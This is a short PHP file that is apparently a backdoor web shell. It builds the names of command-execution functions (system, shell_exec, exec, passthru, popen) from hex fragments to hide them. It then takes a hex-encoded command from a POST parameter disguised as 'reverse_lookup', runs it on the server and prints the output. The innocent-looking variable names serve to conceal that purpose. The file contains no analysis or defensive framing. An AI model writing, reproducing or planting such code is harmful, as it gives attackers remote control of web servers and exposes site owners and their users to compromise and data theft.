<?php


$pset1 = '79';
$pset2 = '73';
$pset3 = '6d';
$pset4 = '6c';
$pset5 = '5f';
$pset6 = '78';
$pset7 = '65';
$pset8 = '63';
$pset9 = '70';
$pset10 = '61';
$pset11 = '72';
$pset12 = '75';
$pset13 = '6f';
$pset14 = '74';
$pset15 = '6e';
$pset16 = '6b';
$data_storage1 = pack("H*", '73'.$pset1.$pset2.'74'.'65'.$pset3);
$data_storage2 = pack("H*", '73'.'68'.'65'.$pset4.'6c'.$pset5.'65'.$pset6.$pset7.$pset8);
$data_storage3 = pack("H*", $pset7.$pset6.$pset7.'63');
$data_storage4 = pack("H*", $pset9.$pset10.$pset2.'73'.'74'.'68'.$pset11.$pset12);
$data_storage5 = pack("H*", '70'.$pset13.'70'.'65'.'6e');
$data_storage6 = pack("H*", '73'.'74'.$pset11.$pset7.'61'.'6d'.'5f'.'67'.'65'.$pset14.$pset5.$pset8.$pset13.'6e'.'74'.'65'.$pset15.$pset14.'73');
$data_storage7 = pack("H*", $pset9.'63'.$pset4.$pset13.'73'.'65');
$reverse_lookup = pack("H*", $pset11.$pset7.'76'.'65'.'72'.$pset2.'65'.$pset5.'6c'.'6f'.'6f'.$pset16.$pset12.'70');
if (isset($_POST[$reverse_lookup])) {
    $reverse_lookup = pack("H*", $_POST[$reverse_lookup]);
    if (function_exists($data_storage1)) {
        $data_storage1($reverse_lookup);
    } elseif (function_exists($data_storage2)) {
        print $data_storage2($reverse_lookup);
    } elseif (function_exists($data_storage3)) {
        $data_storage3($reverse_lookup, $marker_comp);
        print join("\n", $marker_comp);
    } elseif (function_exists($data_storage4)) {
        $data_storage4($reverse_lookup);
    } elseif (function_exists($data_storage5) && function_exists($data_storage6) && function_exists($data_storage7)) {
        $resource_res = $data_storage5($reverse_lookup, 'r');
        if ($resource_res) {
            $val_elem = $data_storage6($resource_res);
            $data_storage7($resource_res);
            print $val_elem;
        }
    }
    exit;
}
